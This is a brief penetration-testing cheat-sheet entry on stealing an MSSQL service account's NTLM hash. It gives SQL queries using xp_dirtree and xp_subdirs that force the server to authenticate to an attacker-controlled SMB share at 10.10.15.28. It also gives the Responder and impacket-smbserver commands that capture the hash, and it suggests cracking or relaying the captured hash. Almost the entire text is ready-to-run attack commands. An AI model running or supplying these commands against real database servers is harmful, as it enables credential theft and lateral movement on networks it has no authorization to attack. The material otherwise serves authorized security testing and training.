
We can steal the MSSQL server account hash with using `xp_subdirs` or `xp_dirtree` .

To make this work, we need first to start `Responder` or `impacket-smbserver` and execute one of the following SQL queries:

#### XP_DIRTREE Hash Stealing

```ruby
EXEC master..xp_dirtree '\\10.10.15.28\share\'
```

#### XP_SUBDIRS Hash Stealing

```ruby
EXEC master..xp_subdirs '\\10.10.15.28\share\'
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

#### Responder

```ruby
sudo responder -I tun0
```

#### Impacket-smbserver

```ruby
sudo impacket-smbserver share ./ -smb2support
```

